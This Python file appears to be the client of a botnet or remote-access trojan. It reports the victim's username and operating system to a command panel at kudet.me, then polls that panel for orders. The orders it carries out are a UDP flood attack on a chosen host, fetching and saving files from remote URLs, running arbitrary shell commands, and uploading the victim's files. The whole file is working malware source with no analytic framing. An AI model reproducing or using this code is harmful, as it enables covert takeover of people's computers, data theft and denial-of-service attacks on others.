import requests
import os
import socket
import base64
import time
import thread
import webbrowser
from Socket import HTTPSocket

C = HTTPSocket()
PanelURL = "http://kudet.me/update/"
cid = "update"
username = os.getenv("USERNAME")
Y = "|BN|"

if os.name == "posix":
    username = os.getenv("USER")
elif os.name == "nt":
    username = os.getenv("USERNAME")
else:
    username = os.getenv("USER")

base_code = base64.b64encode(username)
uid = cid + "_" + base_code
cp_name = os.getenv("computername")

C.host = PanelURL
C.vic_id = uid

if os.name == "posix":
    oss = "GNU/LINUX"
elif os.name == 'nt':
    oss = "Microsoft Windows"
else:
    oss = "MacOS"


C.Connect(uid + Y + username  + Y + oss + Y + "Unknown" + Y + "Online")

def IND(status):
    status = True
    while status == True:
        commands = requests.get(PanelURL + "/getCommand.php?id=" + uid)
        split_command = base64.b64decode(commands.text).split(Y)

        if split_command[0] == '':
            print("")
        else:
	    if split_command[0] == "Ping":
                C.Send("Ping")

            if split_command[0] == "PrintMessage":
                print(split_command[1])
                C.Send("CleanCommands")

            if split_command[0] == "OpenPage":
                webbrowser.open(split_command[1])
                C.Send("CleanCommands")

            if split_command[0] == "DDOSAttack":
                port = 80
                sent = 0
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                flood = os
                while split_command[1] == "Enable":
                    sock.sendto(flood.urandom(1490), (split_command[2], port))
                    sent = sent + 1
                    port = port + 1
                    if port == 65534:
                        port = 1
                pass

            if split_command[0] == "UploadFile":
                file_url = split_command[1]
                r = requests.get(file_url, stream=True)
                with open(split_command[2], "wb") as new_file:
                    for chunk in r.iter_content(chunk_size=1024):
                        if chunk:
                            new_file.write(chunk)
                        pass
                    C.Send("CleanCommands")

            if split_command[0] == "Uninstall":
                C.Send("Uninstall")
                quit()

            if split_command[0] == "Close":
                C.Send("Offline")
                quit()

            if split_command[0] == "Execute":
                os.system(split_command[1])
                C.Send("CleanCommands")

            if split_command[0] == "Upload":
                C.Upload(split_command[1])
                C.Send("CleanCommands")
    pass
pass

thread.start_new_thread(IND(True))
